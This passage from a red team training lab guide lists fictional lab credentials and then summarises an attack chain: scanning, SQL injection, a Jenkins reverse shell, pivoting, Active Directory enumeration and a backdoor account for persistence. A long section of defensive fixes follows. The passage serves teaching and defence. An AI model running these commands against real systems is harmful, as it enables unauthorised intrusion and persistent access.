internal access | 3-4 steps | 20-30 min | SQLi, VPN, enumeration |\n| Chained multi-hop | 10+ steps | 60-90 min | All pivoting techniques |\n\n### Stuck?\n\n- If VPN does not connect, the OpenVPN config file may be needed. Check the jumpbox for it.\n- If the jumpbox rejects SSH, try `svc_backup` instead of `admin`\n- For chained pivots, write down each hop and what port/credential you used. It gets confusing!\n\n---\n\n## Phase 9: Credential Summary and Attack Chain Visualization\n\n### All Credentials Discovered\n\n| Source | Username | Password | Where It Works |\n|--------|----------|----------|----------------|\n| SQLi (WordPress) | jsmith | Summer2024 | VPN |\n| SQLi (WordPress) | mwilliams | Welcome123 | VPN |\n| SQLi (WordPress) | svc_backup | Backup2024 | Webserver SSH, Jumpbox SSH, FTP, SMB file server |\n| Jenkins default | admin | admin | Jenkins web UI (172.16.0.100:8080) |\n| Jenkins | developer | Dev2024! | Jenkins web UI |\n| Jumpbox | admin | JumpB0x2024! | Jumpbox SSH (has sudo) |\n| Webserver | admin | Acme2024! | Webserver SSH (has sudo) |\n| FTP anonymous | anonymous | (none) | FTP read-only access to /public |\n| FTP upload | ftpuser | Ftp2024! | FTP read/write access |\n| Wiki / File server | Administrator | Adm1n2024 | Domain Admin on DC (172.16.2.12) |\n| Wiki / Ticketing | root | DBr00t2024! | MySQL on db01 (172.16.2.40) |\n| Ticketing TKT-001 | jsmith | VPN2024! | VPN |\n| VPN generic | vpnuser | VPN2024! | OpenVPN |\n\n### Attack Chain Visualization\n\n```\n+============================================================================+\n|                       COMPLETE ATTACK CHAIN                                 |\n+============================================================================+\n|\n|  PHASE 1: RECONNAISSANCE\n|  +-- nmap -sn 172.16.0.0/24\n|  |   Found: firewall(.1), kali(.10), vpn(.50), NAT(.100)\n|  +-- nmap -sV -sC -p- 172.16.0.100\n|  |   Found: SSH(22), HTTP(80), HTTPS(443), Jenkins(8080)\n|  +-- gobuster on WordPress\n|      Found: /employees/ directory\n|\n|  PHASE 2: INITIAL ACCESS (choose one)\n|  +-- Option A: SQL Injection\n|  |   +-- SQLi on /employees/?employee_id=1\n|  |   +-- Extracted: jsmith, mwilliams, svc_backup credentials\n|  |   +-- SSH to webserver: svc_backup@172.16.0.100\n|  |\n|  +-- Option B: Jenkins RCE\n|  |   +-- Login with admin:admin\n|  |   +-- Bash injection at /script-console\n|  |   +-- Reverse shell to Kali on port 4444\n|  |\n|  +-- Option C: VPN (skip to internal)\n|      +-- jsmith:Summer2024 or vpnuser:VPN2024!\n|      +-- Direct internal network access\n|\n|  PHASE 3: PIVOTING\n|  +-- SSH Dynamic Tunnel: ssh -D 9050 svc_backup@172.16.0.100\n|  +-- OR Chisel: server on Kali, client on webserver\n|  +-- OR Ligolo-ng: proxy on Kali, agent on webserver\n|  +-- Configure proxychains: socks5 127.0.0.1 9050\n|\n|  PHASE 4: INTERNAL ENUMERATION\n|  +-- Wiki (172.16.2.20)\n|  |   +-- /it/services.html --> DA password: Adm1n2024\n|  |   +-- /it/network.html  --> Full network diagram\n|  |   +-- /it/procedures.html --> svc_backup creds\n|  +-- Ticketing (172.16.2.30)\n|  |   +-- TKT-001 through TKT-006 --> Multiple credentials\n|  +-- MySQL (172.16.2.40)\n|  |   +-- root:DBr00t2024! --> employee_credentials table\n|  +-- File Server (172.16.2.10)\n|  |   +-- sensitive share --> passwords.txt --> DA password\n|  +-- FTP (172.16.1.30)\n|      +-- anonymous --> network-diagram.txt\n|      +-- svc_backup --> old-passwords.txt\n|\n|  PHASE 5: DOMAIN COMPROMISE\n|  +-- Verify: smbclient -L //172.16.2.12 -U 'Administrator%Adm1n2024'\n|  +-- Enumerate: rpcclient enumdomusers, enumdomgroups\n|  +-- Persist: net rpc user add support 'P@ssw0rd123!'\n|  +-- Deep dive: ldapsearch for full domain data\n|\n|  RESULT: Full Domain Administrator access to ACMEWIDGETS.LOCAL\n+============================================================================+\n```\n\n---\n\n## Phase 10: Defensive Analysis -- What Should Acme Widgets Do Differently?\n\nThis is the most important phase. Understanding attacks is only half the picture -- understanding how to PREVENT them is what makes the difference.\n\n### Vulnerability 1: SQL Injection in Employee Directory\n\n**What went wrong:** The employee directory plugin plugs user input directly into SQL queries.\n\n**Impact:** Attackers extracted all employee credentials from the database.\n\n**How to fix it:**\n- Use **parameterized queries** (prepared statements) in all database interactions. This is the single most effective defense.\n- Implement a **Web Application Firewall (WAF)** to detect and block SQL injection attempts\n- Use **least-privilege database accounts** -- the web app should not have permission to read the employees table if it does not need to\n- **Hash all passwords** using bcrypt or argon2 so that even if the database is stolen, passwords are not readable\n\n### Vulnerability 2: Default Jenkins Credentials\n\n**What went wrong:** The CI/CD dashboard uses `admin:admin` as the default password.\n\n**Impact:** Attackers gained remote code execution on the Jenkins server.\n\n**How to fix it:**\n- **Never use default passwords** in production\n- Integrate with **Single Sign-On (SSO)** or Active Directory authentication\n- Require **multi-factor authentication (MFA)** for admin access\n- Restrict access to admin interfaces by **IP whitelist**\n\n### Vulnerability 3: Command Injection in CI/CD\n\n**What went wrong:** The script console passes user input directly to `subprocess.run()` with `shell=True`.\n\n**Impact:** Attackers can execute arbitrary commands on the server.\n\n**How to fix it:**\n- **Never pass user input to shell commands**\n- If you must execute commands, use a whitelist of allowed commands\n- Run CI/CD jobs in **sandboxed containers** with no network access\n- Implement **code review** for all CI/CD pipeline configurations\n\n### Vulnerability 4: Plaintext Credentials on Wiki\n\n**What went wrong:** The internal wiki has Domain Admin credentials, database passwords, and service account credentials in plain text on unauthenticated pages.\n\n**Impact:** Anyone who reaches the internal network can read all passwords.\n\n**How to fix it:**\n- Use a **secrets manager** (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault) instead of storing passwords in wikis or documents\n- Require **authentication** on all internal web applications\n- Implement **access controls** -- not everyone needs to see admin passwords\n- **Audit access** to sensitive pages\n\n### Vulnerability 5: Credentials in Ticketing System\n\n**What went wrong:** IT staff included plaintext passwords in ticket comments (password resets, new employee setups, troubleshooting notes).\n\n**Impact:** Attackers found credentials for VPN, MySQL, and employee accounts.\n\n**How to fix it:**\n- **Train staff** never to include passwords in tickets\n- Use **automated password delivery** through secure channels\n- Implement **data loss prevention (DLP)** rules to flag tickets containing password patterns\n- **Redact or purge** sensitive data from closed tickets\n\n### Vulnerability 6: Password Reuse Across Systems\n\n**What went wrong:** The `svc_backup` account uses the same password (`Backup2024`) on the webserver, jumpbox, FTP, and file server.\n\n**Impact:** Compromising one system gave access to many others.\n\n**How to fix it:**\n- **Unique passwords** for every system and account\n- Use a **password manager** for service accounts\n- Implement **Managed Service Accounts (MSAs)** in Active Directory, which automatically rotate passwords\n- **MFA everywhere** -- even if a password is stolen, the attacker still needs a second factor\n\n### Vulnerability 7: Anonymous FTP Access\n\n**What went wrong:** The FTP server allows anonymous access to a public directory that contains a network diagram.\n\n**Impact:** Attackers get a complete map of the network for free.\n\n**How to fix it:**\n- **Disable anonymous FTP** access\n- Use **SFTP** (SSH File Transfer Protocol) instead of FTP\n- Do not store sensitive documents like network diagrams on publicly accessible shares\n\n### Vulnerability 8: Weak Firewall Rules\n\n**What went wrong:** The firewall allows SSH directly from the internet to the webserver. Jenkins is exposed without any rate limiting or IP restrictions.\n\n**Impact:** Attackers can directly attempt authentication and exploitation.\n\n**How to fix it:**\n- Use a **VPN** as the only way to reach internal/DMZ services from the internet\n- Implement **rate limiting** and **IP allow-listing** on exposed services\n- Use an **intrusion prevention system (IPS)** to detect and block attacks\n- Enable **logging and alerting** for authentication failures\n\n### Vulnerability 9: Weak Domain Password Policy\n\n**What went wrong:** Password policy has no complexity requirements and only a 7-character minimum.\n\n**Impact:** Users set weak passwords that are easy to guess or crack.\n\n**How to fix it:**\n- Require **minimum 12 characters** with complexity rules\n- Implement **account lockout** after 5 failed attempts\n- Check passwords against **known breached password lists**\n- Require **MFA** for all domain accounts\n\n### Vulnerability 10: No Network Monitoring\n\n**What went wrong:** There was no detection of our scanning, pivoting, or lateral movement.\n\n**Impact:** Attackers moved freely through the network without being noticed.\n\n**How to fix it:**\n- Deploy a **Security Information and Event Management (SIEM)** system\n- Monitor for **anomalous authentication** (new accounts, unusual login times/locations)\n- Implement **network detection and response (NDR)** to catch lateral movement\n- Deploy **endpoint detection and response (EDR)** on all servers\n- Set up **honeypots** -- fake services that alert when accessed\n\n### The Big Picture\n\nAcme Widgets made the classic mistake: they invested in perimeter security (the firewall) but left the interior wide open. This is called the \"hard shell, soft center\" approach, and it is how most real breaches happen.\n\nModern security follows the **Zero Trust** principle: \"Never trust, always verify.\" Every system should authenticate every connection, regardless of where it comes from. Just because a request comes from inside the network does not mean it is legitimate.\n\n---\n\n## Mission Complete!\n\nCongratulations! You have completed the Red Team Training Lab v3.\n\n### Skills You Demonstrated\n\n- Network reconnaissance through firewalls\n- SQL injection exploitation (manual and automated)\n- Command injection and reverse shell techniques\n- SSH tunneling (local, dynamic, and remote port forwarding)\n- Chisel reverse SOCKS proxy setup\n- Ligolo-ng TUN interface tunneling\n- Proxychains configuration and usage\n- Internal network enumeration across multiple services\n- Active Directory enumeration via SMB, RPC, and LDAP\n- Credential harvesting from diverse sources\n- Persistence through backdoor account creation\n- Defensive analysis and remediation recommendations\n\n### Next Steps\n\n1. **Try a different attack path** -- if you used SQLi, try the Jenkins path instead\n2. **Speed run** -- can you get Domain Admin in under 30 minutes?\n3. **Write a pentest report** -- document your findings as if you were delivering them to a client\n4. **Think like a defender** -- for each step you took, what alert or control would have stopped you?\n5. **Study for certifications** -- this lab covers skills tested in OSCP, PNPT, CEH, and GPEN\n\n### Remember\n\nThese techniques are powerful and should only be used with **explicit written authorization**. Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA) and similar laws worldwide. Always get written permission before testing.\n\nGood luck on your cybersecurity journey!\n"
}